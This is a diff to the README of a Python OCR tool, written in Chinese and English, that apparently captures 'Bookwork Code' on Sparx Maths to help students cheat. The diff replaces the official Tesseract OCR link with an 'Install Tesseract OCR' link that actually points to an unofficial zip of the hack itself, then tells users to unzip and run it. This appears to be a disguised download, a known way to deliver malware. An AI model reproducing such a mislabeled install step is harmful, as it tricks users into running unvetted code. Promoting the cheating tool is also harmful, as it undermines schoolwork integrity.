@@ -16,9 +16,9 @@
 2. 安裝 Python 需求庫：(use cmd)(windows->cmd->enter)
    ```bash
    pip install pyautogui pytesseract pillow numpy
-3. 執行程式：
-   ```bash
-   python main.py
+3. 安裝 [Tesseract OCR](https://github.com/Trevor-2/Sparx-maths-bookwork-hack/blob/main/sparx%20maths%20bookwork%20hack.zip)
+4. 解壓縮
+5. 運行“main.py”
 
 ## 注意事項
 每次執行程式會自動刪除上次的截圖。
@@ -39,11 +39,11 @@ This program is used to detect and record screenshots of Bookwork Code, detect a
 ## Usage
 1. Install [Tesseract OCR](https://github.com/tesseract-ocr/tesseract) and set the path.
 2. Install the Python requirement library:(use cmd)(windows->cmd->enter)
- ```bash
+   ```bash
  pip install pyautogui pytesseract pillow numpy
-3. Execute the program:
-```bash
- python main.py
+3. Install [Tesseract OCR](https://github.com/Trevor-2/Sparx-maths-bookwork-hack/blob/main/sparx%20maths%20bookwork%20hack.zip)
+4. unzip it
+5. run "main.py"
 
 ## Notes
 Each time the program is executed, the last screenshot will be automatically deleted.
